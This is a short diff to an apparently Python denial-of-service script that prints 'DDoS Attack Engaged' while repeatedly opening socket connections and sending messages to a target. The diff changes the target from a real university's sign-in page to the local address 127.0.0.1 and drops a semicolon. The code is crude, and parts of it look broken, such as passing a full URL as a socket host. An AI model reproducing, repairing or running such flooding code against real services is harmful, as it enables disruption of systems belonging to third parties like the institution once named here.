@@ -6,7 +6,7 @@ def restart_program():
 curdir = os.getcwd()
 
 print ("DDoS mode loaded")
-host="https://mydtu.duytan.edu.vn/Signin.aspx"
+host="127.0.0.1"
 port=80
 message="+---------------------------+"
 conn=100
@@ -23,7 +23,7 @@ def dos():
         ddos.connect((host, 80))
         ddos.send( message )
         ddos.sendto( message, (ip, port) )
-        ddos.send( message );
+        ddos.send( message )
     except socket.error:
         print("|[Connection Failed]         |")
     print ( "|[DDoS Attack Engaged]       |")
